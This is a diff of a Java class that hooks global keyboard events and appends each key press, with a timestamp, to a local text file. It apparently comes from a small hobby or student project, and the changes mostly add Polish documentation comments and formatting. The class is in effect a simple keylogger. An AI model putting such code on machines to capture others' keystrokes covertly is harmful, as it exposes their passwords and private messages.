@@ -13,43 +13,62 @@ import java.util.Calendar;
 import java.util.Date;
 
 /**
- * Implementacja KeyListener
+ * Created by Rafal Wilk
  */
 public class GlobalKeyListener implements NativeKeyListener {
 
     private static final DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss:SSS");
 
-
+    /**
+     * Metoda wykonuje sie w momencie wcisniecia klawisza na klawiaturze.
+     * Tekst przypisany do wcisnietego klawisza dopisujemy do pliku.
+     *
+     * @param e zdarzenie wcisnieca klawisza
+     */
     public void nativeKeyPressed(NativeKeyEvent e) {
         Calendar calendar = Calendar.getInstance();
         writeToFile("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()), calendar.getTime());
         System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
     }
 
-    //klawisz puszczony
+    /**
+     * Metoda wykonuje sie w momencie puszczenia klawisza na klawiaturze.
+     * Jesli puszczony klawisz byl klawiszem funkcyjnym - zapisujemy go do pliku.
+     *
+     * @param e zdarzenie wcisnieca klawisza
+     */
     public void nativeKeyReleased(NativeKeyEvent e) {
         if (e.getKeyCode() == NativeKeyEvent.VC_ALT ||
                 e.getKeyCode() == NativeKeyEvent.VC_CONTROL ||
                 e.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK ||
-                e.getKeyCode() == NativeKeyEvent.VC_SHIFT){
+                e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
             Calendar calendar = Calendar.getInstance();
             writeToFile("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()), calendar.getTime());
         }
     }
 
-    //klawisz wcisniety
+    /**
+     * Metoda wywoluje sie w momencie nacisniecia przycisku. Metoda potrafi rozpoznac, czy wcisnieta byla mala/duza litera.
+     * Nie dziala, bo nie ma zaimplementowanej mapy klawiszy.
+     *
+     * @param e zdarzenie wcisnieca klawisza
+     */
     public void nativeKeyTyped(NativeKeyEvent e) {
         e.getKeyChar();
     }
 
-    //zapisujemy do pliku
-    private void writeToFile(String text, Date date){
+    /**
+     * Metoda dopusuje tekst na koncy pliku. W przypadku, gdy plik nie istenieje - zostanie on stworzony.
+     *
+     * @param text tekst, ktory chcemy dopisac do pliku
+     * @param date dokladny czas wystapienia zdarzenia
+     */
+    private void writeToFile(String text, Date date) {
         try {
-            //kiedy nie ma pliku to program powinen go sobie utworzyc //gdy jest to dopisuje na koncu
             Writer output = new BufferedWriter(new FileWriter("keyListener.txt", true));
-            output.append(dateFormat.format(date) + "\t"+text +"\n");
+            output.append(dateFormat.format(date)).append("\t").append(text).append("\n");
             output.close();
-        }catch (IOException ioe){
+        } catch (IOException ioe) {
             ioe.printStackTrace();
         }
     }
